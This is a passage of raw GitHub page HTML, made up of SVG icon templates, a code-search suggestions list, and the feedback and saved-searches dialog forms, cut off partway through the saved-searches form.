1.638.54.922 0 1.28-.198 1.442-.379.179-.2.308-.578.308-1.371 0-.765-.123-1.242-.37-1.554-.233-.296-.693-.587-1.713-.7Z"></path><path d="M6.25 9.037a.75.75 0 0 1 .75.75v1.501a.75.75 0 0 1-1.5 0V9.787a.75.75 0 0 1 .75-.75Zm4.25.75v1.501a.75.75 0 0 1-1.5 0V9.787a.75.75 0 0 1 1.5 0Z"></path>
</svg>
</template>

<template id="copilot-error-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copilot-error">
    <path d="M16 11.24c0 .112-.072.274-.21.467L13 9.688V7.862l-.023-.116c-.49.21-1.075.291-1.727.291-.198 0-.388-.009-.571-.029L6.833 5.226a4.01 4.01 0 0 0 .17-.782c.117-.935-.037-1.395-.241-1.614-.193-.206-.637-.413-1.682-.297-.683.076-1.115.231-1.395.415l-1.257-.91c.579-.564 1.413-.877 2.485-.996 1.206-.134 2.262.034 2.944.765.05.053.096.108.139.165.044-.057.094-.112.143-.165.682-.731 1.738-.899 2.944-.765 1.23.137 2.145.528 2.724 1.261.566.715.693 1.614.693 2.484 0 .572-.053 1.148-.254 1.656.066.228.098.429.126.612.012.076.024.148.037.218.924.385 1.522 1.471 1.591 2.095Zm-5.083-8.707c-1.044-.116-1.488.091-1.681.297-.204.219-.359.679-.242 1.614.091.726.303 1.231.618 1.553.299.305.784.54 1.638.54.922 0 1.28-.198 1.442-.379.179-.2.308-.578.308-1.371 0-.765-.123-1.242-.37-1.554-.233-.296-.693-.587-1.713-.7Zm2.511 11.074c-1.393.776-3.272 1.428-5.43 1.428-4.562 0-7.873-2.914-7.998-3.749V9.338c.085-.628.677-1.686 1.588-2.065.013-.07.024-.143.036-.218.029-.183.06-.384.126-.612-.18-.455-.241-.963-.252-1.475L.31 4.107A.747.747 0 0 1 0 3.509V3.49a.748.748 0 0 1 .625-.73c.156-.026.306.047.435.139l14.667 10.578a.592.592 0 0 1 .227.264.752.752 0 0 1 .046.249v.022a.75.75 0 0 1-1.19.596Zm-1.367-.991L5.635 7.964a5.128 5.128 0 0 1-.889.073c-.652 0-1.236-.081-1.727-.291l-.023.116v4.255c.419.323 2.722 1.433 5.002 1.433 1.539 0 3.089-.505 4.063-.934Z"></path>
</svg>
</template>

<template id="workflow-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-workflow">
    <path d="M0 1.75C0 .784.784 0 1.75 0h3.5C6.216 0 7 .784 7 1.75v3.5A1.75 1.75 0 0 1 5.25 7H4v4a1 1 0 0 0 1 1h4v-1.25C9 9.784 9.784 9 10.75 9h3.5c.966 0 1.75.784 1.75 1.75v3.5A1.75 1.75 0 0 1 14.25 16h-3.5A1.75 1.75 0 0 1 9 14.25v-.75H5A2.5 2.5 0 0 1 2.5 11V7h-.75A1.75 1.75 0 0 1 0 5.25Zm1.75-.25a.25.25 0 0 0-.25.25v3.5c0 .138.112.25.25.25h3.5a.25.25 0 0 0 .25-.25v-3.5a.25.25 0 0 0-.25-.25Zm9 9a.25.25 0 0 0-.25.25v3.5c0 .138.112.25.25.25h3.5a.25.25 0 0 0 .25-.25v-3.5a.25.25 0 0 0-.25-.25Z"></path>
</svg>
</template>

<template id="book-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-book">
    <path d="M0 1.75A.75.75 0 0 1 .75 1h4.253c1.227 0 2.317.59 3 1.501A3.743 3.743 0 0 1 11.006 1h4.245a.75.75 0 0 1 .75.75v10.5a.75.75 0 0 1-.75.75h-4.507a2.25 2.25 0 0 0-1.591.659l-.622.621a.75.75 0 0 1-1.06 0l-.622-.621A2.25 2.25 0 0 0 5.258 13H.75a.75.75 0 0 1-.75-.75Zm7.251 10.324.004-5.073-.002-2.253A2.25 2.25 0 0 0 5.003 2.5H1.5v9h3.757a3.75 3.75 0 0 1 1.994.574ZM8.755 4.75l-.004 7.322a3.752 3.752 0 0 1 1.992-.572H14.5v-9h-3.495a2.25 2.25 0 0 0-2.25 2.25Z"></path>
</svg>
</template>

<template id="code-review-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-code-review">
    <path d="M1.75 1h12.5c.966 0 1.75.784 1.75 1.75v8.5A1.75 1.75 0 0 1 14.25 13H8.061l-2.574 2.573A1.458 1.458 0 0 1 3 14.543V13H1.75A1.75 1.75 0 0 1 0 11.25v-8.5C0 1.784.784 1 1.75 1ZM1.5 2.75v8.5c0 .138.112.25.25.25h2a.75.75 0 0 1 .75.75v2.19l2.72-2.72a.749.749 0 0 1 .53-.22h6.5a.25.25 0 0 0 .25-.25v-8.5a.25.25 0 0 0-.25-.25H1.75a.25.25 0 0 0-.25.25Zm5.28 1.72a.75.75 0 0 1 0 1.06L5.31 7l1.47 1.47a.751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018l-2-2a.75.75 0 0 1 0-1.06l2-2a.75.75 0 0 1 1.06 0Zm2.44 0a.75.75 0 0 1 1.06 0l2 2a.75.75 0 0 1 0 1.06l-2 2a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L10.69 7 9.22 5.53a.75.75 0 0 1 0-1.06Z"></path>
</svg>
</template>

<template id="codespaces-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-codespaces">
    <path d="M0 11.25c0-.966.784-1.75 1.75-1.75h12.5c.966 0 1.75.784 1.75 1.75v3A1.75 1.75 0 0 1 14.25 16H1.75A1.75 1.75 0 0 1 0 14.25Zm2-9.5C2 .784 2.784 0 3.75 0h8.5C13.216 0 14 .784 14 1.75v5a1.75 1.75 0 0 1-1.75 1.75h-8.5A1.75 1.75 0 0 1 2 6.75Zm1.75-.25a.25.25 0 0 0-.25.25v5c0 .138.112.25.25.25h8.5a.25.25 0 0 0 .25-.25v-5a.25.25 0 0 0-.25-.25Zm-2 9.5a.25.25 0 0 0-.25.25v3c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25v-3a.25.25 0 0 0-.25-.25Z"></path><path d="M7 12.75a.75.75 0 0 1 .75-.75h4.5a.75.75 0 0 1 0 1.5h-4.5a.75.75 0 0 1-.75-.75Zm-4 0a.75.75 0 0 1 .75-.75h.5a.75.75 0 0 1 0 1.5h-.5a.75.75 0 0 1-.75-.75Z"></path>
</svg>
</template>

<template id="comment-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-comment">
    <path d="M1 2.75C1 1.784 1.784 1 2.75 1h10.5c.966 0 1.75.784 1.75 1.75v7.5A1.75 1.75 0 0 1 13.25 12H9.06l-2.573 2.573A1.458 1.458 0 0 1 4 13.543V12H2.75A1.75 1.75 0 0 1 1 10.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h2a.75.75 0 0 1 .75.75v2.19l2.72-2.72a.749.749 0 0 1 .53-.22h4.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
</svg>
</template>

<template id="comment-discussion-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-comment-discussion">
    <path d="M1.75 1h8.5c.966 0 1.75.784 1.75 1.75v5.5A1.75 1.75 0 0 1 10.25 10H7.061l-2.574 2.573A1.458 1.458 0 0 1 2 11.543V10h-.25A1.75 1.75 0 0 1 0 8.25v-5.5C0 1.784.784 1 1.75 1ZM1.5 2.75v5.5c0 .138.112.25.25.25h1a.75.75 0 0 1 .75.75v2.19l2.72-2.72a.749.749 0 0 1 .53-.22h3.5a.25.25 0 0 0 .25-.25v-5.5a.25.25 0 0 0-.25-.25h-8.5a.25.25 0 0 0-.25.25Zm13 2a.25.25 0 0 0-.25-.25h-.5a.75.75 0 0 1 0-1.5h.5c.966 0 1.75.784 1.75 1.75v5.5A1.75 1.75 0 0 1 14.25 12H14v1.543a1.458 1.458 0 0 1-2.487 1.03L9.22 12.28a.749.749 0 0 1 .326-1.275.749.749 0 0 1 .734.215l2.22 2.22v-2.19a.75.75 0 0 1 .75-.75h1a.25.25 0 0 0 .25-.25Z"></path>
</svg>
</template>

<template id="organization-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-organization">
    <path d="M1.75 16A1.75 1.75 0 0 1 0 14.25V1.75C0 .784.784 0 1.75 0h8.5C11.216 0 12 .784 12 1.75v12.5c0 .085-.006.168-.018.25h2.268a.25.25 0 0 0 .25-.25V8.285a.25.25 0 0 0-.111-.208l-1.055-.703a.749.749 0 1 1 .832-1.248l1.055.703c.487.325.779.871.779 1.456v5.965A1.75 1.75 0 0 1 14.25 16h-3.5a.766.766 0 0 1-.197-.026c-.099.017-.2.026-.303.026h-3a.75.75 0 0 1-.75-.75V14h-1v1.25a.75.75 0 0 1-.75.75Zm-.25-1.75c0 .138.112.25.25.25H4v-1.25a.75.75 0 0 1 .75-.75h2.5a.75.75 0 0 1 .75.75v1.25h2.25a.25.25 0 0 0 .25-.25V1.75a.25.25 0 0 0-.25-.25h-8.5a.25.25 0 0 0-.25.25ZM3.75 6h.5a.75.75 0 0 1 0 1.5h-.5a.75.75 0 0 1 0-1.5ZM3 3.75A.75.75 0 0 1 3.75 3h.5a.75.75 0 0 1 0 1.5h-.5A.75.75 0 0 1 3 3.75Zm4 3A.75.75 0 0 1 7.75 6h.5a.75.75 0 0 1 0 1.5h-.5A.75.75 0 0 1 7 6.75ZM7.75 3h.5a.75.75 0 0 1 0 1.5h-.5a.75.75 0 0 1 0-1.5ZM3 9.75A.75.75 0 0 1 3.75 9h.5a.75.75 0 0 1 0 1.5h-.5A.75.75 0 0 1 3 9.75ZM7.75 9h.5a.75.75 0 0 1 0 1.5h-.5a.75.75 0 0 1 0-1.5Z"></path>
</svg>
</template>

<template id="rocket-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-rocket">
    <path d="M14.064 0h.186C15.216 0 16 .784 16 1.75v.186a8.752 8.752 0 0 1-2.564 6.186l-.458.459c-.314.314-.641.616-.979.904v3.207c0 .608-.315 1.172-.833 1.49l-2.774 1.707a.749.749 0 0 1-1.11-.418l-.954-3.102a1.214 1.214 0 0 1-.145-.125L3.754 9.816a1.218 1.218 0 0 1-.124-.145L.528 8.717a.749.749 0 0 1-.418-1.11l1.71-2.774A1.748 1.748 0 0 1 3.31 4h3.204c.288-.338.59-.665.904-.979l.459-.458A8.749 8.749 0 0 1 14.064 0ZM8.938 3.623h-.002l-.458.458c-.76.76-1.437 1.598-2.02 2.5l-1.5 2.317 2.143 2.143 2.317-1.5c.902-.583 1.74-1.26 2.499-2.02l.459-.458a7.25 7.25 0 0 0 2.123-5.127V1.75a.25.25 0 0 0-.25-.25h-.186a7.249 7.249 0 0 0-5.125 2.123ZM3.56 14.56c-.732.732-2.334 1.045-3.005 1.148a.234.234 0 0 1-.201-.064.234.234 0 0 1-.064-.201c.103-.671.416-2.273 1.15-3.003a1.502 1.502 0 1 1 2.12 2.12Zm6.94-3.935c-.088.06-.177.118-.266.175l-2.35 1.521.548 1.783 1.949-1.2a.25.25 0 0 0 .119-.213ZM3.678 8.116 5.2 5.766c.058-.09.117-.178.176-.266H3.309a.25.25 0 0 0-.213.119l-1.2 1.95ZM12 5a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
</template>

<template id="shield-check-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-shield-check">
    <path d="m8.533.133 5.25 1.68A1.75 1.75 0 0 1 15 3.48V7c0 1.566-.32 3.182-1.303 4.682-.983 1.498-2.585 2.813-5.032 3.855a1.697 1.697 0 0 1-1.33 0c-2.447-1.042-4.049-2.357-5.032-3.855C1.32 10.182 1 8.566 1 7V3.48a1.75 1.75 0 0 1 1.217-1.667l5.25-1.68a1.748 1.748 0 0 1 1.066 0Zm-.61 1.429.001.001-5.25 1.68a.251.251 0 0 0-.174.237V7c0 1.36.275 2.666 1.057 3.859.784 1.194 2.121 2.342 4.366 3.298a.196.196 0 0 0 .154 0c2.245-.957 3.582-2.103 4.366-3.297C13.225 9.666 13.5 8.358 13.5 7V3.48a.25.25 0 0 0-.174-.238l-5.25-1.68a.25.25 0 0 0-.153 0ZM11.28 6.28l-3.5 3.5a.75.75 0 0 1-1.06 0l-1.5-1.5a.749.749 0 0 1 .326-1.275.749.749 0 0 1 .734.215l.97.97 2.97-2.97a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042Z"></path>
</svg>
</template>

<template id="heart-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-heart">
    <path d="m8 14.25.345.666a.75.75 0 0 1-.69 0l-.008-.004-.018-.01a7.152 7.152 0 0 1-.31-.17 22.055 22.055 0 0 1-3.434-2.414C2.045 10.731 0 8.35 0 5.5 0 2.836 2.086 1 4.25 1 5.797 1 7.153 1.802 8 3.02 8.847 1.802 10.203 1 11.75 1 13.914 1 16 2.836 16 5.5c0 2.85-2.045 5.231-3.885 6.818a22.066 22.066 0 0 1-3.744 2.584l-.018.01-.006.003h-.002ZM4.25 2.5c-1.336 0-2.75 1.164-2.75 3 0 2.15 1.58 4.144 3.365 5.682A20.58 20.58 0 0 0 8 13.393a20.58 20.58 0 0 0 3.135-2.211C12.92 9.644 14.5 7.65 14.5 5.5c0-1.836-1.414-3-2.75-3-1.373 0-2.609.986-3.029 2.456a.749.749 0 0 1-1.442 0C6.859 3.486 5.623 2.5 4.25 2.5Z"></path>
</svg>
</template>

<template id="server-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-server">
    <path d="M1.75 1h12.5c.966 0 1.75.784 1.75 1.75v4c0 .372-.116.717-.314 1 .198.283.314.628.314 1v4a1.75 1.75 0 0 1-1.75 1.75H1.75A1.75 1.75 0 0 1 0 12.75v-4c0-.358.109-.707.314-1a1.739 1.739 0 0 1-.314-1v-4C0 1.784.784 1 1.75 1ZM1.5 2.75v4c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25v-4a.25.25 0 0 0-.25-.25H1.75a.25.25 0 0 0-.25.25Zm.25 5.75a.25.25 0 0 0-.25.25v4c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25v-4a.25.25 0 0 0-.25-.25ZM7 4.75A.75.75 0 0 1 7.75 4h4.5a.75.75 0 0 1 0 1.5h-4.5A.75.75 0 0 1 7 4.75ZM7.75 10h4.5a.75.75 0 0 1 0 1.5h-4.5a.75.75 0 0 1 0-1.5ZM3 4.75A.75.75 0 0 1 3.75 4h.5a.75.75 0 0 1 0 1.5h-.5A.75.75 0 0 1 3 4.75ZM3.75 10h.5a.75.75 0 0 1 0 1.5h-.5a.75.75 0 0 1 0-1.5Z"></path>
</svg>
</template>

<template id="globe-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-globe">
    <path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM5.78 8.75a9.64 9.64 0 0 0 1.363 4.177c.255.426.542.832.857 1.215.245-.296.551-.705.857-1.215A9.64 9.64 0 0 0 10.22 8.75Zm4.44-1.5a9.64 9.64 0 0 0-1.363-4.177c-.307-.51-.612-.919-.857-1.215a9.927 9.927 0 0 0-.857 1.215A9.64 9.64 0 0 0 5.78 7.25Zm-5.944 1.5H1.543a6.507 6.507 0 0 0 4.666 5.5c-.123-.181-.24-.365-.352-.552-.715-1.192-1.437-2.874-1.581-4.948Zm-2.733-1.5h2.733c.144-2.074.866-3.756 1.58-4.948.12-.197.237-.381.353-.552a6.507 6.507 0 0 0-4.666 5.5Zm10.181 1.5c-.144 2.074-.866 3.756-1.58 4.948-.12.197-.237.381-.353.552a6.507 6.507 0 0 0 4.666-5.5Zm2.733-1.5a6.507 6.507 0 0 0-4.666-5.5c.123.181.24.365.353.552.714 1.192 1.436 2.874 1.58 4.948Z"></path>
</svg>
</template>

<template id="issue-opened-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-issue-opened">
    <path d="M8 9.5a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path><path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM1.5 8a6.5 6.5 0 1 0 13 0 6.5 6.5 0 0 0-13 0Z"></path>
</svg>
</template>

<template id="device-mobile-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-device-mobile">
    <path d="M3.75 0h8.5C13.216 0 14 .784 14 1.75v12.5A1.75 1.75 0 0 1 12.25 16h-8.5A1.75 1.75 0 0 1 2 14.25V1.75C2 .784 2.784 0 3.75 0ZM3.5 1.75v12.5c0 .138.112.25.25.25h8.5a.25.25 0 0 0 .25-.25V1.75a.25.25 0 0 0-.25-.25h-8.5a.25.25 0 0 0-.25.25ZM8 13a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path>
</svg>
</template>

<template id="package-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-package">
    <path d="m8.878.392 5.25 3.045c.54.314.872.89.872 1.514v6.098a1.75 1.75 0 0 1-.872 1.514l-5.25 3.045a1.75 1.75 0 0 1-1.756 0l-5.25-3.045A1.75 1.75 0 0 1 1 11.049V4.951c0-.624.332-1.201.872-1.514L7.122.392a1.75 1.75 0 0 1 1.756 0ZM7.875 1.69l-4.63 2.685L8 7.133l4.755-2.758-4.63-2.685a.248.248 0 0 0-.25 0ZM2.5 5.677v5.372c0 .09.047.171.125.216l4.625 2.683V8.432Zm6.25 8.271 4.625-2.683a.25.25 0 0 0 .125-.216V5.677L8.75 8.432Z"></path>
</svg>
</template>

<template id="credit-card-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-credit-card">
    <path d="M10.75 9a.75.75 0 0 0 0 1.5h1.5a.75.75 0 0 0 0-1.5h-1.5Z"></path><path d="M0 3.75C0 2.784.784 2 1.75 2h12.5c.966 0 1.75.784 1.75 1.75v8.5A1.75 1.75 0 0 1 14.25 14H1.75A1.75 1.75 0 0 1 0 12.25ZM14.5 6.5h-13v5.75c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25Zm0-2.75a.25.25 0 0 0-.25-.25H1.75a.25.25 0 0 0-.25.25V5h13Z"></path>
</svg>
</template>

<template id="play-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-play">
    <path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM1.5 8a6.5 6.5 0 1 0 13 0 6.5 6.5 0 0 0-13 0Zm4.879-2.773 4.264 2.559a.25.25 0 0 1 0 .428l-4.264 2.559A.25.25 0 0 1 6 10.559V5.442a.25.25 0 0 1 .379-.215Z"></path>
</svg>
</template>

<template id="gift-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-gift">
    <path d="M2 2.75A2.75 2.75 0 0 1 4.75 0c.983 0 1.873.42 2.57 1.232.268.318.497.668.68 1.042.183-.375.411-.725.68-1.044C9.376.42 10.266 0 11.25 0a2.75 2.75 0 0 1 2.45 4h.55c.966 0 1.75.784 1.75 1.75v2c0 .698-.409 1.301-1 1.582v4.918A1.75 1.75 0 0 1 13.25 16H2.75A1.75 1.75 0 0 1 1 14.25V9.332C.409 9.05 0 8.448 0 7.75v-2C0 4.784.784 4 1.75 4h.55c-.192-.375-.3-.8-.3-1.25ZM7.25 9.5H2.5v4.75c0 .138.112.25.25.25h4.5Zm1.5 0v5h4.5a.25.25 0 0 0 .25-.25V9.5Zm0-4V8h5.5a.25.25 0 0 0 .25-.25v-2a.25.25 0 0 0-.25-.25Zm-7 0a.25.25 0 0 0-.25.25v2c0 .138.112.25.25.25h5.5V5.5h-5.5Zm3-4a1.25 1.25 0 0 0 0 2.5h2.309c-.233-.818-.542-1.401-.878-1.793-.43-.502-.915-.707-1.431-.707ZM8.941 4h2.309a1.25 1.25 0 0 0 0-2.5c-.516 0-1 .205-1.43.707-.337.392-.646.975-.879 1.793Z"></path>
</svg>
</template>

<template id="code-square-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-code-square">
    <path d="M0 1.75C0 .784.784 0 1.75 0h12.5C15.216 0 16 .784 16 1.75v12.5A1.75 1.75 0 0 1 14.25 16H1.75A1.75 1.75 0 0 1 0 14.25Zm1.75-.25a.25.25 0 0 0-.25.25v12.5c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25V1.75a.25.25 0 0 0-.25-.25Zm7.47 3.97a.75.75 0 0 1 1.06 0l2 2a.75.75 0 0 1 0 1.06l-2 2a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L10.69 8 9.22 6.53a.75.75 0 0 1 0-1.06ZM6.78 6.53 5.31 8l1.47 1.47a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215l-2-2a.75.75 0 0 1 0-1.06l2-2a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042Z"></path>
</svg>
</template>

<template id="device-desktop-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-device-desktop">
    <path d="M14.25 1c.966 0 1.75.784 1.75 1.75v7.5A1.75 1.75 0 0 1 14.25 12h-3.727c.099 1.041.52 1.872 1.292 2.757A.752.752 0 0 1 11.25 16h-6.5a.75.75 0 0 1-.565-1.243c.772-.885 1.192-1.716 1.292-2.757H1.75A1.75 1.75 0 0 1 0 10.25v-7.5C0 1.784.784 1 1.75 1ZM1.75 2.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25ZM9.018 12H6.982a5.72 5.72 0 0 1-.765 2.5h3.566a5.72 5.72 0 0 1-.765-2.5Z"></path>
</svg>
</template>

        <div class="position-relative">
                <ul
                  role="listbox"
                  class="ActionListWrap QueryBuilder-ListWrap"
                  aria-label="Suggestions"
                  data-action="
                    combobox-commit:query-builder#comboboxCommit
                    mousedown:query-builder#resultsMousedown
                  "
                  data-target="query-builder.resultsList"
                  data-persist-list=false
                  id="query-builder-test-results"
                ></ul>
        </div>
      <div class="FormControl-inlineValidation" id="validation-b6237de8-0785-4b2b-ac5c-f846799174d8" hidden="hidden">
        <span class="FormControl-inlineValidation--visual">
          <svg aria-hidden="true" height="12" viewBox="0 0 12 12" version="1.1" width="12" data-view-component="true" class="octicon octicon-alert-fill">
    <path d="M4.855.708c.5-.896 1.79-.896 2.29 0l4.675 8.351a1.312 1.312 0 0 1-1.146 1.954H1.33A1.313 1.313 0 0 1 .183 9.058ZM7 7V3H5v4Zm-1 3a1 1 0 1 0 0-2 1 1 0 0 0 0 2Z"></path>
</svg>
        </span>
        <span></span>
</div>    </div>
    <div data-target="query-builder.screenReaderFeedback" aria-live="polite" aria-atomic="true" class="sr-only"></div>
</query-builder></form>
          <div class="d-flex flex-row color-fg-muted px-3 text-small color-bg-default search-feedback-prompt">
            <a target="_blank" href="https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax" data-view-component="true" class="Link color-fg-accent text-normal ml-2">Search syntax tips</a>            <div class="d-flex flex-1"></div>
          </div>
        </div>
</div>

    </div>
</modal-dialog></div>
  </div>
  <div data-action="click:qbsearch-input#retract" class="dark-backdrop position-fixed" hidden data-target="qbsearch-input.darkBackdrop"></div>
  <div class="color-fg-default">
    
<dialog-helper>
  <dialog data-target="qbsearch-input.feedbackDialog" data-action="close:qbsearch-input#handleDialogClose cancel:qbsearch-input#handleDialogClose" id="feedback-dialog" aria-modal="true" aria-labelledby="feedback-dialog-title" aria-describedby="feedback-dialog-description" data-view-component="true" class="Overlay Overlay-whenNarrow Overlay--size-medium Overlay--motion-scaleFade Overlay--disableScroll">
    <div data-view-component="true" class="Overlay-header">
  <div class="Overlay-headerContentWrap">
    <div class="Overlay-titleWrap">
      <h1 class="Overlay-title " id="feedback-dialog-title">
        Provide feedback
      </h1>
        
    </div>
    <div class="Overlay-actionWrap">
      <button data-close-dialog-id="feedback-dialog" aria-label="Close" type="button" data-view-component="true" class="close-button Overlay-closeButton"><svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg></button>
    </div>
  </div>
  
</div>
      <scrollable-region data-labelled-by="feedback-dialog-title">
        <div data-view-component="true" class="Overlay-body">        <!-- '"` --><!-- </textarea></xmp> --></option></form><form id="code-search-feedback-form" data-turbo="false" action="/search/feedback" accept-charset="UTF-8" method="post"><input type="hidden" data-csrf="true" name="authenticity_token" value="/c+WlZC+yBNW8d3Jz1jOgMm3/j320jmlghNg+AOl8/z4MKHWvDXmqeyPjgmuOvLa1K0NG5JCYZjYsRfwNVE8aA==" />
          <p>We read every piece of feedback, and take your input very seriously.</p>
          <textarea name="feedback" class="form-control width-full mb-2" style="height: 120px" id="feedback"></textarea>
          <input name="include_email" id="include_email" aria-label="Include my email address so I can be contacted" class="form-control mr-2" type="checkbox">
          <label for="include_email" style="font-weight: normal">Include my email address so I can be contacted</label>
</form></div>
      </scrollable-region>
      <div data-view-component="true" class="Overlay-footer Overlay-footer--alignEnd">          <button data-close-dialog-id="feedback-dialog" type="button" data-view-component="true" class="btn">    Cancel
</button>
          <button form="code-search-feedback-form" data-action="click:qbsearch-input#submitFeedback" type="submit" data-view-component="true" class="btn-primary btn">    Submit feedback
</button>
</div>
</dialog></dialog-helper>

    <custom-scopes data-target="qbsearch-input.customScopesManager">
    
<dialog-helper>
  <dialog data-target="custom-scopes.customScopesModalDialog" data-action="close:qbsearch-input#handleDialogClose cancel:qbsearch-input#handleDialogClose" id="custom-scopes-dialog" aria-modal="true" aria-labelledby="custom-scopes-dialog-title" aria-describedby="custom-scopes-dialog-description" data-view-component="true" class="Overlay Overlay-whenNarrow Overlay--size-medium Overlay--motion-scaleFade Overlay--disableScroll">
    <div data-view-component="true" class="Overlay-header Overlay-header--divided">
  <div class="Overlay-headerContentWrap">
    <div class="Overlay-titleWrap">
      <h1 class="Overlay-title " id="custom-scopes-dialog-title">
        Saved searches
      </h1>
        <h2 id="custom-scopes-dialog-description" class="Overlay-description">Use saved searches to filter your results more quickly</h2>
    </div>
    <div class="Overlay-actionWrap">
      <button data-close-dialog-id="custom-scopes-dialog" aria-label="Close" type="button" data-view-component="true" class="close-button Overlay-closeButton"><svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg></button>
    </div>
  </div>
  
</div>
      <scrollable-region data-labelled-by="custom-scopes-dialog-title">
        <div data-view-component="true" class="Overlay-body">        <div data-target="custom-scopes.customScopesModalDialogFlash"></div>

        <div hidden class="create-custom-scope-form" data-target="custom-scopes.createCustomScopeForm">
        <!-- '"` --><!-- </textarea></xmp> --></option></form><form id="custom-scopes-dialog-form" data-turbo="false" action="/search/custom_scopes" accept-charset="UTF-8" method="post"><input type="hidden" data-csrf="true" name="authenticity_token" value="dena830xrzuxGacHrOu1B6LAC3JTRooQ2hzK5Dquke5/PWsBMZYrGQKgVLHeQ+Nn/DUkx8KI3OrlM5o3Lg9ZWg==" />
          <div data-target="custom-scopes.customScopesModalDialogFlash"></div>

          <input type="hidden" id="custom_scope_id" name="custom_scope_id" data-target="custom-scopes.customScopesIdField">

          <div class="form-group">
            <label for="custom_scope_name">Name</label>
            <auto-check src="/search/custom_scopes/check_name" required>
              <input
                type="text"
                name="custom_scope_name"
                id="custom_scope_name"
                data-target="custom-scopes.customScopesNameField"
                class="form-control"
                autocomplete="off"
                placeholder="github-ruby"
                required
                maxlength="50">
              <input type="hidden" data-csrf="true" value="D67uNyMo968euNE6gDBUoqedXsw/Io5bqQdot4GFQS0daO/tqbYy8TmEu9YkwOKp2Y4QIgbD6B11UwSE26nv9g==" />
            </auto-check>
          </div>

          <div class="form-group">
            <label for="custom_scope_query">Query</label>
            <input
              type="text"
              name="custom_scope_query"
              id="custom_scope_query"
              data-target="custom-scopes.customScopesQueryField"
              class="form-control"
              autocomplete="off"
              placeholder="(repo:mona/a OR repo:mona/b) AND lang:python"
              required
              maxlength="500">
